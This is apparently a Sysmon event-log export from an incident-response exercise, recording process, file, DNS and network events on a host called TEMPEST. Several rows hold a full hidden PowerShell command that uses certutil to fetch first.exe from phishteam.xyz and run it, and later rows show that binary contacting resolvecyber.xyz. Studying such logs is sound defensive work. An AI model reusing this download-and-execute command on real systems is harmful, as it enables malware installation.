243,7748,2022-06-20 17:15:09.4079466,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 4388, ProcessGUID: 4bbef3ae-ab1d-62b0-860a-000000000700",RuleName: -,"MD5=C2938EB5FF932C2540A1514CC82C197C,SHA256=5D8273BF98397E4C5053F8F154E5F838C7E8A798B125FCAD33CAB16E2515B665,IMPHASH=23F95F4561FF7B0F5E78BCFF2C87F2A2",ParentProcess: C:\Windows\explorer.exe,"ParentProcessID: 5784, ParentProcessGUID: 4bbef3ae-ab0a-62b0-6a0a-000000000700",ParentCommandLine: C:\Windows\Explorer.EXE,"""C:\Program Files (x86)\Microsoft OneDrive\OneDrive.exe"" /background",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:09.407""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1d-62b0-860a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4388""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft OneDrive\\OneDrive.exe""},{""@Name"":""FileVersion"",""#text"":""21.220.1024.0005""},{""@Name"":""Description"",""#text"":""Microsoft OneDrive""},{""@Name"":""Product"",""#text"":""Microsoft OneDrive""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""OneDrive.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Program Files (x86)\\Microsoft OneDrive\\OneDrive.exe\"" /background""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-ab09-62b0-1ca9-b00100000000""},{""@Name"":""LogonId"",""#text"":""0x1B0A91C""},{""@Name"":""TerminalSessionId"",""#text"":""11""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=C2938EB5FF932C2540A1514CC82C197C,SHA256=5D8273BF98397E4C5053F8F154E5F838C7E8A798B125FCAD33CAB16E2515B665,IMPHASH=23F95F4561FF7B0F5E78BCFF2C87F2A2""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-ab0a-62b0-6a0a-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""5784""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\explorer.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""ParentUser"",""#text"":""TEMPEST\\benimaru""}]}}"
244,7749,2022-06-20 17:15:09.9307609,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 4280, ProcessGUID: 4bbef3ae-ab1d-62b0-870a-000000000700",RuleName: -,"MD5=6168B0C085C5E1EB42573F61EC98869C,SHA256=5D2DFE5E38580C3D121D33E0DEDFF27EB224882BFF67AD9C82F6E591EB86D9D6,IMPHASH=F1BD76570610F7300A5420F49F23D76C",ParentProcess: C:\Program Files (x86)\Microsoft OneDrive\OneDrive.exe,"ParentProcessID: 4388, ParentProcessGUID: 4bbef3ae-ab1d-62b0-860a-000000000700","ParentCommandLine: ""C:\Program Files (x86)\Microsoft OneDrive\OneDrive.exe"" /background","""C:\Program Files (x86)\Microsoft OneDrive\21.220.1024.0005\Microsoft.SharePoint.exe"" /silentConfig",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:09.922""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1d-62b0-870a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4280""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft OneDrive\\21.220.1024.0005\\Microsoft.SharePoint.exe""},{""@Name"":""FileVersion"",""#text"":""21.220.1024.0005""},{""@Name"":""Description"",""#text"":""Microsoft SharePoint""},{""@Name"":""Product"",""#text"":""Microsoft SharePoint""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""Microsoft.SharePoint.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Program Files (x86)\\Microsoft OneDrive\\21.220.1024.0005\\Microsoft.SharePoint.exe\"" /silentConfig""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-ab09-62b0-1ca9-b00100000000""},{""@Name"":""LogonId"",""#text"":""0x1B0A91C""},{""@Name"":""TerminalSessionId"",""#text"":""11""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=6168B0C085C5E1EB42573F61EC98869C,SHA256=5D2DFE5E38580C3D121D33E0DEDFF27EB224882BFF67AD9C82F6E591EB86D9D6,IMPHASH=F1BD76570610F7300A5420F49F23D76C""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-ab1d-62b0-860a-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""4388""},{""@Name"":""ParentImage"",""#text"":""C:\\Program Files (x86)\\Microsoft OneDrive\\OneDrive.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Program Files (x86)\\Microsoft OneDrive\\OneDrive.exe\"" /background""},{""@Name"":""ParentUser"",""#text"":""TEMPEST\\benimaru""}]}}"
245,7750,2022-06-20 17:15:10.5485748,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 9052, ProcessGUID: 4bbef3ae-ab1e-62b0-880a-000000000700",RuleName: -,"MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",ParentProcess: C:\Windows\explorer.exe,"ParentProcessID: 5784, ParentProcessGUID: 4bbef3ae-ab0a-62b0-6a0a-000000000700",ParentCommandLine: C:\Windows\Explorer.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:10.547""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1e-62b0-880a-000000000700""},{""@Name"":""ProcessId"",""#text"":""9052""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows PowerShell""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""PowerShell.EXE""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\\Users\\Public\\Downloads\\first.exe; C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-ab09-62b0-1ca9-b00100000000""},{""@Name"":""LogonId"",""#text"":""0x1B0A91C""},{""@Name"":""TerminalSessionId"",""#text"":""11""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-ab0a-62b0-6a0a-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""5784""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\explorer.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""ParentUser"",""#text"":""TEMPEST\\benimaru""}]}}"
246,7751,2022-06-20 17:15:11.0267328,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 9052, ProcessGUID: 4bbef3ae-ab1e-62b0-880a-000000000700",RuleName: -,Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\__PSScriptPolicyTest_l54w2dza.bnq.ps1,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:11.018""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1e-62b0-880a-000000000700""},{""@Name"":""ProcessId"",""#text"":""9052""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\__PSScriptPolicyTest_l54w2dza.bnq.ps1""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:15:11.018""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
247,7752,2022-06-20 17:15:11.3350601,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 7484, ProcessGUID: 4bbef3ae-ab1f-62b0-8a0a-000000000700",RuleName: -,"MD5=535CF1F8E8CF3382AB8F62013F967DD8,SHA256=85DD6F8EDF142F53746A51D11DCBA853104BB0207CDF2D6C3529917C3C0FC8DF,IMPHASH=683B8A445B00A271FC57848D893BD6C4",ParentProcess: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"ParentProcessID: 9052, ParentProcessGUID: 4bbef3ae-ab1e-62b0-880a-000000000700","ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe","""C:\Windows\system32\certutil.exe"" -urlcache -split -f http://phishteam.xyz/02dcf07/first.exe C:\Users\Public\Downloads\first.exe",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:11.311""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1f-62b0-8a0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""7484""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\certutil.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""CertUtil.exe""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""CertUtil.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\system32\\certutil.exe\"" -urlcache -split -f http://phishteam.xyz/02dcf07/first.exe C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-ab09-62b0-1ca9-b00100000000""},{""@Name"":""LogonId"",""#text"":""0x1B0A91C""},{""@Name"":""TerminalSessionId"",""#text"":""11""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=535CF1F8E8CF3382AB8F62013F967DD8,SHA256=85DD6F8EDF142F53746A51D11DCBA853104BB0207CDF2D6C3529917C3C0FC8DF,IMPHASH=683B8A445B00A271FC57848D893BD6C4""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-ab1e-62b0-880a-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""9052""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\\Users\\Public\\Downloads\\first.exe; C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""ParentUser"",""#text"":""TEMPEST\\benimaru""}]}}"
248,7753,2022-06-20 17:15:11.3792710,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,RegistryEvent (Value Set),TEMPEST\benimaru,,"ProcessID: 4280, ProcessGUID: 4bbef3ae-ab1d-62b0-870a-000000000700",RuleName: T1042,Image: C:\Program Files (x86)\Microsoft OneDrive\21.220.1024.0005\Microsoft.SharePoint.exe,EventType: SetValue,TargetObject: HKU\S-1-5-21-349058839-1848105669-1528301110-1001_Classes\mssharepointclient\shell\open\command\(Default),"Details: ""C:\Program Files (x86)\Microsoft OneDrive\21.220.1024.0005\Microsoft.SharePoint.exe"" /protocol:""%%1""",,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1042""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:11.376""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1d-62b0-870a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4280""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft OneDrive\\21.220.1024.0005\\Microsoft.SharePoint.exe""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-349058839-1848105669-1528301110-1001_Classes\\mssharepointclient\\shell\\open\\command\\(Default)""},{""@Name"":""Details"",""#text"":""\""C:\\Program Files (x86)\\Microsoft OneDrive\\21.220.1024.0005\\Microsoft.SharePoint.exe\"" /protocol:\""%%1\""""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
249,7754,2022-06-20 17:15:11.8638029,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,4,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 7484, ProcessGUID: 4bbef3ae-ab1f-62b0-8a0a-000000000700",RuleName: -,Image: C:\Windows\system32\certutil.exe,QueryName: phishteam.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:c7bf;::ffff:167.71.199.191;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:10.090""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1f-62b0-8a0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""7484""},{""@Name"":""QueryName"",""#text"":""phishteam.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:c7bf;::ffff:167.71.199.191;""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
250,7755,2022-06-20 17:15:13.0770738,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 7484, ProcessGUID: 4bbef3ae-ab1f-62b0-8a0a-000000000700",RuleName: EXE,Image: C:\Windows\system32\certutil.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Microsoft\Windows\INetCache\IE\UT0RWORY\first[1].exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:13.065""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1f-62b0-8a0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""7484""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\UT0RWORY\\first[1].exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:15:13.065""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
251,7756,2022-06-20 17:15:13.1601833,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,4,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 7484, ProcessGUID: 4bbef3ae-ab1f-62b0-8a0a-000000000700",RuleName: -,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.199.191,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:10.151""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1f-62b0-8a0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""7484""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51870""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.199.191""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
252,7757,2022-06-20 17:15:14.1112817,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 7484, ProcessGUID: 4bbef3ae-ab1f-62b0-8a0a-000000000700",RuleName: Downloads,Image: C:\Windows\system32\certutil.exe,TargetFilename: C:\Users\Public\Downloads\first.exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Downloads""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:14.096""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1f-62b0-8a0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""7484""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 14:29:54.049""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
253,7758,2022-06-20 17:15:14.1325699,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: -,"MD5=C9AA36F483B61CFA9758C44ACDB776AC,SHA256=CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8,IMPHASH=468991D410EEFBCFB478FB910DDA2CE2",ParentProcess: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"ParentProcessID: 9052, ParentProcessGUID: 4bbef3ae-ab1e-62b0-880a-000000000700","ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe","""C:\Users\Public\Downloads\first.exe""",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:14.129""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""FileVersion"",""#text"":""-""},{""@Name"":""Description"",""#text"":""-""},{""@Name"":""Product"",""#text"":""-""},{""@Name"":""Company"",""#text"":""-""},{""@Name"":""OriginalFileName"",""#text"":""-""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Users\\Public\\Downloads\\first.exe\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-ab09-62b0-1ca9-b00100000000""},{""@Name"":""LogonId"",""#text"":""0x1B0A91C""},{""@Name"":""TerminalSessionId"",""#text"":""11""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=C9AA36F483B61CFA9758C44ACDB776AC,SHA256=CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8,IMPHASH=468991D410EEFBCFB478FB910DDA2CE2""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-ab1e-62b0-880a-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""9052""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\\Users\\Public\\Downloads\\first.exe; C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""ParentUser"",""#text"":""TEMPEST\\benimaru""}]}}"
254,7759,2022-06-20 17:15:14.9869687,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,4,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 7484, ProcessGUID: 00000000-0000-0000-0000-000000000000",RuleName: -,Image: &lt;unknown process&gt;,QueryName: phishteam.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:c7bf;::ffff:167.71.199.191;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:11.584""},{""@Name"":""ProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ProcessId"",""#text"":""7484""},{""@Name"":""QueryName"",""#text"":""phishteam.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:c7bf;::ffff:167.71.199.191;""},{""@Name"":""Image"",""#text"":""&lt;unknown process&gt;""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
255,7760,2022-06-20 17:15:15.9881727,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,4,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: -,Image: C:\Users\Public\Downloads\first.exe,QueryName: resolvecyber.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:dea2;::ffff:167.71.222.162;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:12.861""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""QueryName"",""#text"":""resolvecyber.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:dea2;::ffff:167.71.222.162;""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
256,7761,2022-06-20 17:15:16.0502390,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,4,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: Usermode,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.222.162,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Usermode""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:12.912""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51873""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.222.162""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
257,7762,2022-06-20 17:15:18.0039043,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,4,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 4280, ProcessGUID: 4bbef3ae-ab1d-62b0-870a-000000000700",RuleName: -,Image: &lt;unknown process&gt;,QueryName: oneclient.sfx.ms,QueryStatus: 0,QueryResults: type:  5 oneclient.sfx.ms.edgekey.net;type:  5 e9659.dspg.akamaiedge.net;2001:fe0:10:680::25bb;2001:fe0:10:685::25bb;::ffff:184.87.128.117;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:15.182""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1d-62b0-870a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4280""},{""@Name"":""QueryName"",""#text"":""oneclient.sfx.ms""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""type:  5 oneclient.sfx.ms.edgekey.net;type:  5 e9659.dspg.akamaiedge.net;2001:fe0:10:680::25bb;2001:fe0:10:685::25bb;::ffff:184.87.128.117;""},{""@Name"":""Image"",""#text"":""&lt;unknown process&gt;""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
